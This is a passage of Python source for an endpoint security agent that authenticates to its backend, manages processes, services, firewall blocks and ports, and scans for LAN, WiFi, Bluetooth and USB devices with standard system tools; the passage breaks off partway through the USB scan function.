        """Report backend (8001) feature families that are remote-only vs tied to monolithic agent flows."""
        supported_command_types = {
            "scan",
            "full_scan",
            "network_scan",
            "wifi_scan",
            "bluetooth_scan",
            "port_scan",
            "threat_hunt",
            "collect_forensics",
            "update_config",
            "reload_edm_dataset",
            "update_edm_dataset",
            "quarantine_file",
            "quarantine",
            "block_ip",
            "kill_process",
            "vpn_connect",
            "vpn_disconnect",
            "get_status",
            "restart",
            "trivy_scan",
            "container_scan",
            "falco_status",
            "falco_health",
            "suricata_status",
            "suricata_health",
            "volatility_scan",
            "volatility_status",
        }

        backend_feature_families = [
            {
                "feature": "Container security scanners (Trivy/Falco/Suricata)",
                "backend_routes": ["/api/containers", "/api/containers/scan", "/api/containers/runtime-events"],
                "agent_command_type": ["trivy_scan", "falco_status", "suricata_status"],
                "integration_status": "partial",
                "notes": "Endpoint now supports local tool command execution; backend container analytics pipeline remains server-side.",
            },
            {
                "feature": "Volatility memory forensics service",
                "backend_routes": ["/api/edr/* memory forensics flows"],
                "agent_command_type": ["collect_forensics", "volatility_scan", "volatility_status"],
                "integration_status": "partial",
                "notes": "Endpoint can execute local volatility command flows; backend advanced memory pipeline remains server-side.",
            },
            {
                "feature": "CSPM cloud posture scans",
                "backend_routes": ["/api/cspm/*"],
                "agent_command_type": None,
                "integration_status": "remote_only",
                "notes": "Server-side cloud posture engine; endpoint role is currently telemetry-only.",
            },
            {
                "feature": "Advanced MCP tools execution",
                "backend_routes": ["/api/advanced/mcp/*"],
                "agent_command_type": "generic backend dispatch",
                "integration_status": "partial",
                "notes": "Backend command queue exists; endpoint command handlers are explicit and limited to supported command_type set.",
            },
            {
                "feature": "Unified command dispatch baseline",
                "backend_routes": ["/api/unified/agents/{agent_id}/command"],
                "agent_command_type": "multiple",
                "integration_status": "wired",
                "notes": "Added alias parity for backend literals full_scan and quarantine.",
            },
        ]

        return {
            "checked_at": datetime.now(timezone.utc).isoformat(),
            "supported_agent_command_types": sorted(supported_command_types),
            "backend_feature_families": backend_feature_families,
        }

    def _backend_api_base(self) -> str:
        """Resolve backend API base URL for integration orchestration calls."""
        configured = (
            os.environ.get("REMOTE_SERVER_URL")
            or os.environ.get("BACKEND_URL")
            or getattr(self.agent.config, "server_url", "")
            or "http://backend:8001"
        ).strip()
        if not configured:
            return ""
        base = configured.rstrip("/")
        if not base.endswith("/api"):
            base = f"{base}/api"
        return base

    def _ensure_backend_jwt(self) -> Optional[str]:
        """Return a cached JWT, or log in to get one.  Never raises."""
        if self._cached_jwt:
            return self._cached_jwt
        if _requests is None:
            return None
        base = self._backend_api_base()
        if not base:
            return None
        try:
            resp = _requests.post(
                f"{base}/auth/login",
                json={"email": self._LOCAL_EMAIL, "password": self._LOCAL_PASSWORD},
                timeout=5,
            )
            if resp.status_code == 200:
                self._cached_jwt = resp.json().get("access_token")
                return self._cached_jwt
        except Exception:
            pass
        return None

    def _backend_headers(self) -> Dict[str, str]:
        headers: Dict[str, str] = {"Content-Type": "application/json"}
        
        # 1. Prefer machine token from env (infrastructure-level secret)
        token = (os.environ.get("INTEGRATION_API_KEY") or os.environ.get("SWARM_AGENT_TOKEN") or "").strip()
        if token:
            headers["X-Internal-Token"] = token
            return headers

        # 2. Prefer per-agent auth token if monolithic core is initialized (canonical identity)
        if self.monolithic_agent and hasattr(self.monolithic_agent, 'config'):
            agent_token = getattr(self.monolithic_agent.config, 'auth_token', '')
            agent_id = getattr(self.monolithic_agent.config, 'agent_id', '')
            if agent_token and agent_id:
                headers["X-Agent-Id"] = agent_id
                headers["X-Agent-Token"] = agent_token
                return headers

        # 3. Fall back to JWT user auth (human dashboard session)
        jwt = self._ensure_backend_jwt()
        if jwt:
            headers["Authorization"] = f"Bearer {jwt}"
        return headers

    def _backend_request(
        self,
        method: str,
        path: str,
        *,
        payload: Optional[Dict[str, Any]] = None,
        timeout: float = 20.0,
    ) -> Dict[str, Any]:
        base = self._backend_api_base()
        if not base:
            return {"ok": False, "error": "backend_api_base_unavailable"}
        if _requests is None:
            return {"ok": False, "error": "requests_dependency_unavailable", "base_url": base}
        req_path = path if str(path).startswith("/") else f"/{path}"
        url = f"{base}{req_path}"
        try:
            response = _requests.request(
                method=method.upper(),
                url=url,
                headers=self._backend_headers(),
                json=payload,
                timeout=timeout,
            )
            # 503 means the machine token header was sent but the backend has no
            # key configured — clear the cached machine-token path and retry with JWT.
            if response.status_code == 503:
                self._cached_jwt = None
                jwt = self._ensure_backend_jwt()
                if jwt:
                    jwt_headers = {"Content-Type": "application/json", "Authorization": f"Bearer {jwt}"}
                    response = _requests.request(
                        method=method.upper(),
                        url=url,
                        headers=jwt_headers,
                        json=payload,
                        timeout=timeout,
                    )
            try:
                data = response.json()
            except Exception:
                data = {"raw": response.text[:2000]}
            return {
                "ok": 200 <= response.status_code < 300,
                "status_code": response.status_code,
                "data": data,
                "url": url,
            }
        except Exception as exc:
            return {"ok": False, "error": str(exc), "url": url}

    def get_core_integration_tools(self) -> Dict[str, Any]:
        fallback = list(self.CORE_INTEGRATION_TOOLS)
        call = self._backend_request("GET", "/integrations/runtime/tools", timeout=10)
        if not call.get("ok"):
            return {
                "available": False,
                "source": "fallback",
                "tools": fallback,
                "error": call.get("error") or (call.get("data") or {}).get("detail"),
                "backend_status_code": call.get("status_code"),
                "backend_base_url": self._backend_api_base(),
            }
        data = call.get("data") if isinstance(call.get("data"), dict) else {}
        tools = [str(t).strip().lower() for t in (data.get("tools") or []) if str(t).strip()]
        filtered = [tool for tool in tools if tool in self.CORE_INTEGRATION_TOOLS]
        return {
            "available": True,
            "source": "backend",
            "tools": filtered or fallback,
            "backend_status_code": call.get("status_code"),
            "backend_base_url": self._backend_api_base(),
        }

    def get_core_integrations_status(self, runtime_target: str = "server", agent_id: Optional[str] = None) -> Dict[str, Any]:
        statuses: Dict[str, Any] = {}
        failures: List[Dict[str, Any]] = []
        target = str(runtime_target or "server").strip().lower()
        for tool in self.CORE_INTEGRATION_TOOLS:
            payload = {
                "tool": tool,
                "params": {"action": "status"},
                "runtime_target": target,
                "agent_id": agent_id or None,
            }
            call = self._backend_request("POST", "/integrations/runtime/run", payload=payload, timeout=25)
            if call.get("ok"):
                data = call.get("data") if isinstance(call.get("data"), dict) else {}
                statuses[tool] = {
                    "ok": True,
                    "job_id": data.get("job_id"),
                    "status": data.get("status"),
                    "result": data.get("result"),
                }
            else:
                detail = call.get("data") if isinstance(call.get("data"), dict) else {}
                statuses[tool] = {
                    "ok": False,
                    "error": call.get("error") or detail.get("detail") or detail,
                    "status_code": call.get("status_code"),
                }
                failures.append({"tool": tool, "error": statuses[tool]["error"], "status_code": call.get("status_code")})

        return {
            "checked_at": datetime.now(timezone.utc).isoformat(),
            "runtime_target": target,
            "agent_id": agent_id or None,
            "backend_base_url": self._backend_api_base(),
            "tools": statuses,
            "ready": len(failures) == 0,
            "failures": failures,
        }

    def launch_core_integration(
        self,
        tool: str,
        params: Optional[Dict[str, Any]] = None,
        runtime_target: str = "server",
        agent_id: Optional[str] = None,
    ) -> Dict[str, Any]:
        normalized_tool = str(tool or "").strip().lower()
        if normalized_tool not in self.CORE_INTEGRATION_TOOLS:
            return {"ok": False, "error": f"unsupported_tool:{normalized_tool}"}

        payload = {
            "tool": normalized_tool,
            "params": params or {},
            "runtime_target": str(runtime_target or "server").strip().lower(),
            "agent_id": agent_id or None,
        }
        call = self._backend_request("POST", "/integrations/runtime/run", payload=payload, timeout=45)
        if call.get("ok"):
            data = call.get("data") if isinstance(call.get("data"), dict) else {}
            return {
                "ok": True,
                "tool": normalized_tool,
                "job_id": data.get("job_id"),
                "status": data.get("status"),
                "queue_id": data.get("queue_id"),
                "decision_id": data.get("decision_id"),
                "result": data.get("result"),
            }
        detail = call.get("data") if isinstance(call.get("data"), dict) else {}
        return {
            "ok": False,
            "tool": normalized_tool,
            "status_code": call.get("status_code"),
            "error": call.get("error") or detail.get("detail") or detail,
        }

    def list_core_integration_jobs(self, limit: int = 20) -> Dict[str, Any]:
        call = self._backend_request("GET", "/integrations/jobs", timeout=15)
        if not call.get("ok"):
            detail = call.get("data") if isinstance(call.get("data"), dict) else {}
            return {
                "ok": False,
                "jobs": [],
                "error": call.get("error") or detail.get("detail") or detail,
                "status_code": call.get("status_code"),
                "backend_base_url": self._backend_api_base(),
            }
        rows = call.get("data") if isinstance(call.get("data"), list) else []
        filtered = [row for row in rows if str((row or {}).get("tool") or "").lower() in self.CORE_INTEGRATION_TOOLS]
        return {
            "ok": True,
            "jobs": filtered[: max(1, int(limit or 20))],
            "backend_base_url": self._backend_api_base(),
            "count": len(filtered),
        }

    def _vpn_interface_order(self) -> List[str]:
        """Return interface candidates in preferred order, honoring monolithic config when available."""
        ordered = []
        if self.monolithic_agent is not None:
            try:
                cfg_name = self.monolithic_agent.vpn.config_file.stem
                if cfg_name and cfg_name not in ordered:
                    ordered.append(cfg_name)
            except Exception:
                pass
        for iface in self.VPN_INTERFACES:
            if iface not in ordered:
                ordered.append(iface)
        return ordered

    def _monitors(self) -> Dict[str, Any]:
        """Return active monitor map, preferring monolithic UnifiedAgent when available."""
        if self.monolithic_agent is not None:
            try:
                return getattr(self.monolithic_agent, "monitors", {}) or {}
            except Exception:
                return {}
        return getattr(self.agent, "monitors", {}) or {}

    def _resolve_monitor_name(self, monitor_name: str) -> str:
        """Normalize incoming API monitor names to runtime monitor keys."""
        normalized = (monitor_name or "").strip().lower().replace("-", "_")
        if normalized in self._monitors():
            return normalized
        alias = self.MONITOR_NAME_ALIASES.get((monitor_name or "").strip().lower())
        if alias:
            return alias
        return normalized

    # --- Process management ---
    def get_processes(self, filter_text: str = "", sort_col: str = "cpu",
                      sort_reverse: bool = True) -> list:
        if not psutil:
            return []
        rows = []
        filt = filter_text.lower()
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                try:
                    info = proc.info
                    name = info.get('name', '') or ''
                    if filt and filt not in name.lower():
                        continue
                    rows.append({
                        "pid": info.get('pid', 0),
                        "name": name,
                        "cpu": round(info.get('cpu_percent', 0) or 0, 1),
                        "memory": round(info.get('memory_percent', 0) or 0, 1),
                        "status": info.get('status', 'unknown')
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass
        # Sort
        key_map = {"pid": "pid", "name": "name", "cpu": "cpu", "memory": "memory", "status": "status"}
        sort_key = key_map.get(sort_col, "cpu")
        try:
            if sort_key in ("pid", "cpu", "memory"):
                rows.sort(key=lambda r: r[sort_key], reverse=sort_reverse)
            else:
                rows.sort(key=lambda r: str(r[sort_key]).lower(), reverse=sort_reverse)
        except Exception:
            pass
        return rows

    def kill_process(self, pid: int) -> dict:
        if not psutil:
            return {"success": False, "error": "psutil not available"}
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            self.add_event("INFO", f"Terminated {name} (PID {pid})")
            self.log(f"Killed process {name} PID={pid}")
            return {"success": True, "message": f"Terminated {name} (PID {pid})"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def lower_process_priority(self, pid: int) -> dict:
        if not psutil:
            return {"success": False, "error": "psutil not available"}
        try:
            p = psutil.Process(pid)
            name = p.name()
            if platform.system() == "Windows":
                p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            else:
                current = p.nice()
                p.nice(min(current + 5, 19))
            self.add_event("INFO", f"Lowered priority: {name} (PID {pid})")
            return {"success": True, "message": f"Lowered priority of {name} (PID {pid})"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- Service management ---
    def get_services(self, filter_text: str = "") -> list:
        rows = []
        filt = filter_text.lower()
        os_name = platform.system()

        if os_name == "Windows":
            try:
                if psutil:
                    for svc in psutil.win_service_iter():
                        try:
                            info = svc.as_dict()
                            svc_name = info.get("name", "")
                            display = info.get("display_name", "")
                            status = info.get("status", "unknown")
                            start_type = info.get("start_type", "unknown")
                            if filt and filt not in svc_name.lower() and filt not in display.lower():
                                continue
                            rows.append({"name": svc_name, "display": display,
                                         "status": status, "start_type": start_type})
                        except Exception:
                            continue
            except Exception:
                # Fallback to sc query
                try:
                    result = subprocess.run(
                        ['sc', 'query', 'type=', 'service', 'state=', 'all'],
                        capture_output=True, text=True, timeout=15)
                    lines = result.stdout.split('\n')
                    svc_name = ''
                    svc_state = ''
                    for line in lines:
                        line_s = line.strip()
                        if line_s.startswith("SERVICE_NAME:"):
                            svc_name = line_s.split(":", 1)[1].strip()
                        elif 'STATE' in line_s and ':' in line_s:
                            svc_state = line_s.split(':', 1)[1].strip().split()[0]
                        elif line_s == '' and svc_name:
                            if not filt or filt in svc_name.lower():
                                rows.append({"name": svc_name, "display": svc_name,
                                             "status": svc_state, "start_type": ""})
                            svc_name = ''
                            svc_state = ''
                except Exception:
                    pass

        elif os_name == "Linux":
            try:
                result = subprocess.run(
                    ['systemctl', 'list-units', '--type=service', '--all',
                     '--no-pager', '--plain', '--no-legend'],
                    capture_output=True, text=True, timeout=15)
                for line in result.stdout.splitlines():
                    parts = line.split(None, 4)
                    if len(parts) < 4:
                        continue
                    unit = parts[0].removesuffix('.service') if hasattr(str, 'removesuffix') else parts[0].replace('.service', '')
                    load_state = parts[1]
                    active_state = parts[2]
                    sub_state = parts[3]
                    description = parts[4] if len(parts) > 4 else ''
                    if load_state == 'not-found':
                        continue
                    status = active_state if active_state != 'active' else sub_state
                    if filt and filt not in unit.lower() and filt not in description.lower():
                        continue
                    rows.append({"name": unit, "display": description or unit,
                                 "status": status, "start_type": load_state})
            except Exception:
                # Fallback: service --status-all
                try:
                    result = subprocess.run(['service', '--status-all'],
                                            capture_output=True, text=True, timeout=15)
                    for line in (result.stdout + result.stderr).splitlines():
                        line = line.strip()
                        if not line:
                            continue
                        # format: " [ + ]  service_name"
                        status = 'running' if '[ + ]' in line else 'stopped'
                        name = line.split(']', 1)[-1].strip() if ']' in line else line
                        if filt and filt not in name.lower():
                            continue
                        rows.append({"name": name, "display": name,
                                     "status": status, "start_type": ""})
                except Exception:
                    pass

        elif os_name == "Darwin":
            try:
                result = subprocess.run(['launchctl', 'list'],
                                        capture_output=True, text=True, timeout=15)
                for line in result.stdout.splitlines():
                    parts = line.split('\t', 2)
                    if len(parts) < 3 or parts[0] == 'PID':
                        continue
                    pid_field = parts[0].strip()
                    # status_field = parts[1].strip()
                    label = parts[2].strip()
                    status = 'running' if pid_field != '-' else 'loaded'
                    if filt and filt not in label.lower():
                        continue
                    rows.append({"name": label, "display": label,
                                 "status": status, "start_type": "launchd"})
            except Exception:
                pass

        rows.sort(key=lambda r: r["name"].lower())
        return rows

    def service_action(self, svc_name: str, action: str) -> dict:
        os_name = platform.system()
        try:
            if os_name == "Windows":
                result = subprocess.run(['sc', action, svc_name],
                                        capture_output=True, text=True, timeout=15)
                out = result.stdout.strip()[:200]
            elif os_name == "Linux":
                cmd = ['systemctl', action, svc_name + '.service']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                out = (result.stdout + result.stderr).strip()[:200]
            elif os_name == "Darwin":
                if action == "start":
                    cmd = ['launchctl', 'start', svc_name]
                elif action == "stop":
                    cmd = ['launchctl', 'stop', svc_name]
                else:
                    return {"success": False, "error": f"Unsupported action: {action}"}
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                out = (result.stdout + result.stderr).strip()[:200]
            else:
                return {"success": False, "error": f"Service management not supported on {os_name}"}
            self.add_event("INFO", f"Service {action}: {svc_name}")
            return {"success": result.returncode == 0,
                    "message": f"{action} {svc_name}: {out}" if out else f"{action} {svc_name}: OK"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- Connection management ---
    def get_connections(self, filter_text: str = "", show_listen: bool = False) -> list:
        if not psutil:
            return []
        rows = []
        filt = filter_text.lower()
        try:
            conns = psutil.net_connections(kind='inet')
            for c in conns:
                try:
                    status = c.status or ''
                    if not show_listen and status == 'LISTEN':
                        continue
                    if status == 'NONE':
                        continue
                    local = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ''
                    remote = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ''
                    proc_name = ''
                    try:
                        if c.pid:
                            proc_name = psutil.Process(c.pid).name()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        proc_name = f'PID {c.pid}'
                    family = 'TCP' if c.type == socket.SOCK_STREAM else 'UDP'
                    if filt and filt not in proc_name.lower() and filt not in remote.lower() and filt not in local.lower():
                        continue
                    rows.append({
                        "pid": c.pid or 0, "process": proc_name,
                        "local": local, "remote": remote,
                        "status": status, "family": family
                    })
                except Exception:
                    continue
        except (psutil.AccessDenied, OSError):
            pass
        rows.sort(key=lambda r: (0 if r["status"] == "ESTABLISHED" else 1, r["remote"]))
        return rows

    def kill_connection(self, pid: int) -> dict:
        return self.kill_process(pid)

    def block_ip(self, remote_ip: str) -> dict:
        if remote_ip in ('127.0.0.1', '0.0.0.0', '::1', ''):
            return {"success": False, "error": "Cannot block localhost"}
        try:
            rule_name = f"SeraphAI-Block-{remote_ip}"
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}', 'dir=out', 'action=block',
                f'remoteip={remote_ip}', 'protocol=any'
            ], capture_output=True, text=True, timeout=10)
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}-In', 'dir=in', 'action=block',
                f'remoteip={remote_ip}', 'protocol=any'
            ], capture_output=True, text=True, timeout=10)
            self.add_event("CRITICAL", f"Blocked IP: {remote_ip} via firewall")
            self.log(f"Blocked IP {remote_ip}")
            return {"success": True, "message": f"Blocked {remote_ip}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- Port management ---
    def get_ports(self) -> list:
        if not psutil:
            return []
        rows = []
        try:
            conns = psutil.net_connections(kind='inet')
            seen = set()
            for c in conns:
                if c.status != 'LISTEN':
                    continue
                if not c.laddr:
                    continue
                port = c.laddr.port
                addr = c.laddr.ip
                key = f"{addr}:{port}"
                if key in seen:
                    continue
                seen.add(key)
                proc_name = ''
                try:
                    if c.pid:
                        proc_name = psutil.Process(c.pid).name()
                except Exception:
                    proc_name = f'PID {c.pid}'
                proto = 'TCP' if c.type == socket.SOCK_STREAM else 'UDP'
                flag = SUSPICIOUS_PORTS.get(port, '')
                rows.append({
                    "port": port, "protocol": proto, "pid": c.pid or 0,
                    "process": proc_name, "address": addr, "suspicious": flag
                })
        except (psutil.AccessDenied, OSError):
            pass
        rows.sort(key=lambda r: r["port"])
        return rows

    def kill_listener(self, pid: int) -> dict:
        return self.kill_process(pid)

    # --- Network scanning ---
    def scan_network(self) -> dict:
        self.log("Starting network scan...")
        # Go straight to ARP fallback — scapy requires Npcap driver
        # which may not be installed and causes multi-minute hangs
        return self._scan_network_arp_fallback()

    def _scan_network_arp_fallback(self) -> dict:
        """LAN discovery using /proc/net/arp → ip neigh → arp-scan → ping+arp."""
        start = time.time()
        devices = []
        seen_ips: set = set()

        def _add(ip: str, mac: str, method: str):
            if ip and ip not in seen_ips and not ip.startswith('127.'):
                seen_ips.add(ip)
                devices.append({"ip": ip, "mac": mac.replace('-', ':').lower(),
                                 "hostname": ip, "type": method})

        # 1. /proc/net/arp — always available on Linux, no tools needed
        try:
            with open('/proc/net/arp') as f:
                next(f)
                for line in f:
                    cols = line.split()
                    if len(cols) >= 4 and cols[3] != '00:00:00:00:00:00':
                        _add(cols[0], cols[3], 'proc_arp')
        except Exception:
            pass

        # 2. ip neigh show — picks up recently-resolved neighbours
        try:
            r = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                parts = line.split()
                if 'lladdr' in parts:
                    idx = parts.index('lladdr')
                    if idx + 1 < len(parts) and parts[-1] not in ('FAILED', 'INCOMPLETE'):
                        _add(parts[0], parts[idx + 1], 'ip_neigh')
        except Exception:
            pass

        # 3. arp-scan --localnet (sends actual ARP requests, catches devices that
        #    aren't yet in the kernel's table)
        try:
            r = subprocess.run(
                ['arp-scan', '--localnet', '--retry=2'],
                capture_output=True, text=True, timeout=30
            )
            for line in r.stdout.splitlines():
                m = _re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})', line)
                if m:
                    _add(m.group(1), m.group(2), 'arp-scan')
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        except Exception:
            pass

        # 4. Windows fallback (arp -a with dynamic entries)
        if platform.system().lower() == 'windows':
            try:
                r = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 2 and 'dynamic' in line.lower():
                        if _re.match(r'\d+\.\d+\.\d+\.\d+', parts[0]):
                            _add(parts[0], parts[1], 'arp')
            except Exception:
                pass

        elapsed = round(time.time() - start, 2)
        self.add_event("INFO", f"Network scan: {len(devices)} devices found in {elapsed}s")
        return {"success": True, "devices": devices, "scan_time": elapsed}

    def scan_wireless(self) -> dict:
        """WiFi scan: iw dev scan → iwlist scan → nmcli fallback."""
        self.log("Starting wireless scan...")
        start = time.time()
        networks = []

        if platform.system().lower() == 'windows':
            try:
                r = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                    capture_output=True, text=True, timeout=15
                )
                current: dict = {}
                for line in r.stdout.splitlines():
                    line = line.strip()
                    if line.startswith('SSID') and not line.startswith('BSSID'):
                        if current.get('ssid'):
                            networks.append(current)
                        current = {'ssid': line.split(':', 1)[1].strip()}
                    elif line.startswith('BSSID'):
                        current['bssid'] = line.split(':', 1)[1].strip().lower()
                    elif line.startswith('Signal'):
                        current['signal'] = line.split(':', 1)[1].strip()
                    elif line.startswith('Authentication'):
                        current['auth'] = line.split(':', 1)[1].strip()
                if current.get('ssid'):
                    networks.append(current)
            except Exception as e:
                self.log(f"Windows WiFi scan error: {e}", "ERROR")
        else:
            # Enumerate wireless interfaces from sysfs
            wifi_ifaces = []
            try:
                from pathlib import Path as _Path
                for p in _Path('/sys/class/net').iterdir():
                    if (p / 'wireless').exists() or (p / 'phy80211').exists():
                        wifi_ifaces.append(p.name)
            except Exception:
                pass
            if not wifi_ifaces:
                for name in ('wlan0', 'wlp0s20f3', 'wlp2s0', 'wlp3s0', 'wifi0'):
                    try:
                        socket.if_nametoindex(name)
                        wifi_ifaces.append(name)
                    except Exception:
                        pass

            def _parse_iw(iface):
                nets = []
                try:
                    r = subprocess.run(['iw', 'dev', iface, 'scan'],
                                       capture_output=True, text=True, timeout=20)
                    if r.returncode != 0:
                        return []
                    cur: dict = {}
                    for line in r.stdout.splitlines():
                        line = line.strip()
                        if line.startswith('BSS '):
                            if cur.get('bssid'):
                                nets.append(cur)
                            bssid = _re.split(r'[(\s]', line.replace('BSS ', ''), 1)[0]
                            cur = {'bssid': bssid.lower()}
                        elif _re.match(r'SSID:', line):
                            cur['ssid'] = line.split(':', 1)[1].strip()
                        elif _re.match(r'signal:', line, _re.I):
                            raw = line.split(':', 1)[1].strip().split()[0]
                            try:
                                cur['signal'] = f"{max(0,min(100,int(2*(float(raw)+100))))}%"
                            except Exception:
                                cur['signal'] = raw
                        elif 'RSN:' in line:
                            cur['auth'] = 'WPA2'
                        elif 'WPA:' in line and 'auth' not in cur:
                            cur['auth'] = 'WPA'
                    if cur.get('bssid'):
                        nets.append(cur)
                    for n in nets:
                        n.setdefault('auth', 'open')
                        n.setdefault('interface', iface)
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
                except Exception as e:
                    self.log(f"iw scan error on {iface}: {e}", "DEBUG")
                return nets

            def _parse_iwlist(iface):
                nets = []
                try:
                    r = subprocess.run(['iwlist', iface, 'scan'],
                                       capture_output=True, text=True, timeout=20)
                    if r.returncode != 0 or 'No scan results' in r.stdout:
                        return []
                    cur: dict = {}
                    for line in r.stdout.splitlines():
                        line = line.strip()
                        if 'Cell ' in line and 'Address:' in line:
                            if cur.get('bssid'):
                                nets.append(cur)
                            cur = {'bssid': line.split('Address:')[1].strip().lower()}
                        elif line.startswith('ESSID:'):
                            cur['ssid'] = line.split('"')[1] if '"' in line else ''
                        elif 'Quality=' in line:
                            try:
                                q, tot = (line.split('Quality=')[1].split('/')[0],
                                          line.split('Quality=')[1].split('/')[1].split()[0])
                                cur['signal'] = f"{int(int(q)*100/int(tot))}%"
                            except Exception:
                                pass
                        elif 'Encryption key:' in line:
                            cur['_enc'] = 'on' in line
                        elif 'WPA2' in line or 'IEEE 802.11i' in line:
                            cur['auth'] = 'WPA2'
                        elif 'WPA' in line and 'auth' not in cur:
                            cur['auth'] = 'WPA'
                    if cur.get('bssid'):
                        nets.append(cur)
                    for n in nets:
                        if 'auth' not in n:
                            n['auth'] = 'open' if not n.get('_enc') else 'WEP'
                        n.pop('_enc', None)
                        n.setdefault('interface', iface)
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
                except Exception as e:
                    self.log(f"iwlist scan error on {iface}: {e}", "DEBUG")
                return nets

            for iface in wifi_ifaces:
                found = _parse_iw(iface) or _parse_iwlist(iface)
                networks.extend(found or [])

            # nmcli fallback
            if not networks:
                try:
                    r = subprocess.run(
                        ['nmcli', '-t', '-f', 'SSID,BSSID,SIGNAL,SECURITY',
                         'device', 'wifi', 'list'],
                        capture_output=True, text=True, timeout=15
                    )
                    for line in r.stdout.strip().splitlines():
                        parts = line.split(':')
                        if len(parts) >= 4:
                            networks.append({
                                'ssid': parts[0],
                                'bssid': parts[1].lower(),
                                'signal': parts[2] + '%',
                                'auth': parts[3] or 'open',
                            })
                except Exception:
                    pass

        elapsed = round(time.time() - start, 2)
        self.add_event("INFO", f"Wireless scan: {len(networks)} networks found in {elapsed}s")
        return {"success": True, "networks": networks, "scan_time": elapsed}

    def scan_bluetooth(self) -> dict:
        """Bluetooth scan: bluetoothctl → hcitool scan → hcitool lescan."""
        self.log("Starting Bluetooth scan...")
        start = time.time()
        devices = []

        if platform.system().lower() == 'windows':
            try:
                ps = ('Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq "OK"} '
                      '| Select-Object FriendlyName,DeviceID | ConvertTo-Json')
                r = subprocess.run(['powershell', '-Command', ps],
                                   capture_output=True, text=True, timeout=15)
                if r.stdout:
                    import json as _json
                    data = _json.loads(r.stdout)
                    if isinstance(data, dict):
                        data = [data]
                    for d in data:
                        devices.append({'name': d.get('FriendlyName', 'Unknown'),
                                         'address': d.get('DeviceID', ''), 'type': 'paired'})
            except Exception as e:
                self.log(f"Windows BT scan error: {e}", "ERROR")
        else:
            # Check adapter
            has_adapter = False
            try:
                from pathlib import Path as _Path
                has_adapter = any(True for _ in _Path('/sys/class/bluetooth').iterdir())
            except Exception:
                pass
            if not has_adapter:
                try:
                    r = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=5)
                    has_adapter = 'hci' in r.stdout
                except Exception:
                    pass

            if not has_adapter:
                elapsed = round(time.time() - start, 2)
                self.add_event("INFO", "Bluetooth scan: no adapter found")
                return {"success": True, "devices": [], "message": "No Bluetooth adapter found",
                        "scan_time": elapsed}

            # bluetoothctl
            try:
                proc = subprocess.Popen(
                    ['bluetoothctl'], stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                try:
                    stdout, _ = proc.communicate(
                        input='power on\nagent on\nscan on\n', timeout=12
                    )
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout, _ = proc.communicate()
                seen: set = set()
                for line in stdout.splitlines():
                    m = _re.search(r'Device\s+([0-9A-Fa-f:]{17})\s+(.*)', line)
                    if m:
                        addr = m.group(1).lower()
                        if addr not in seen:
                            seen.add(addr)
                            devices.append({'address': addr,
                                             'name': m.group(2).strip() or 'Unknown',
                                             'type': 'discovered'})
            except FileNotFoundError:
                pass
            except Exception as e:
                self.log(f"bluetoothctl error: {e}", "DEBUG")

            # hcitool fallback
            if not devices:
                try:
                    r = subprocess.run(['hcitool', 'scan', '--flush'],
                                       capture_output=True, text=True, timeout=15)
                    for line in r.stdout.strip().splitlines()[1:]:
                        parts = line.strip().split('\t')
                        if parts and ':' in parts[0]:
                            devices.append({'address': parts[0].lower(),
                                             'name': parts[1].strip() if len(parts) > 1 else 'Unknown',
                                             'type': 'classic'})
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
                except Exception as e:
                    self.log(f"hcitool scan error: {e}", "DEBUG")

            # BLE scan
            try:
                proc = subprocess.Popen(
                    ['hcitool', 'lescan', '--duplicates'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                time.sleep(5)
                proc.terminate()
                try:
                    stdout, _ = proc.communicate(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout, _ = proc.communicate()
                seen_ble: set = {d.get('address') for d in devices}
                for line in stdout.strip().splitlines()[1:]:
                    parts = line.strip().split(None, 1)
                    if parts and ':' in parts[0]:
                        addr = parts[0].lower()
                        if addr not in seen_ble:
                            seen_ble.add(addr)
                            devices.append({'address': addr,
                                             'name': parts[1].strip() if len(parts) > 1 else 'BLE Device',
                                             'type': 'ble'})
            except (FileNotFoundError, Exception):
                pass

        elapsed = round(time.time() - start, 2)
        self.add_event("INFO", f"Bluetooth scan: {len(devices)} devices found in {elapsed}s")
        return {"success": True, "devices": devices, "scan_time": elapsed}

    def scan_usb(self) -> dict:
        """Snapshot USB and removable devices without starting a continuous monitor."""
        self.log("Starting USB scan...")
        start = time.time()
        devices = []
        seen = set()

        def _record(name: str, source: str, mountpoint: str = "", extra: dict = None):
            key = (name or "", source, mountpoint or "")
            if key in seen:
                return
            seen.add(key)
            row = {
                "name": name or "Unknown USB device",
                "source": source,
                "mountpoint": mountpoint or "",
            }
            if extra:
                row.update(extra)
            devices.append(row)

        try:
            if psutil:
